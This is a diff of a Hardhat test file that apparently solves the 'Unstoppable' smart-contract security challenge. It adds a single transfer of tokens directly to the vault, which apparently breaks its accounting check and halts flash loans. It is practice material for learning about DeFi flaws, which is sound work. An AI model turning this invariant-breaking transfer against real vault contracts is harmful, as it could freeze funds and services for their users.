@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Unstoppable', function () {
+describe.only('[Challenge] Unstoppable', function () {
     let deployer, player, someUser;
     let token, vault, receiverContract;
 
@@ -45,6 +45,10 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("------------")
+        await token.transfer(vault.address, 100n * 10n ** 18n);
+
+        // await receiverContract.executeFlashLoan(100n * 10n ** 18n);
     });
 
     after(async function () {
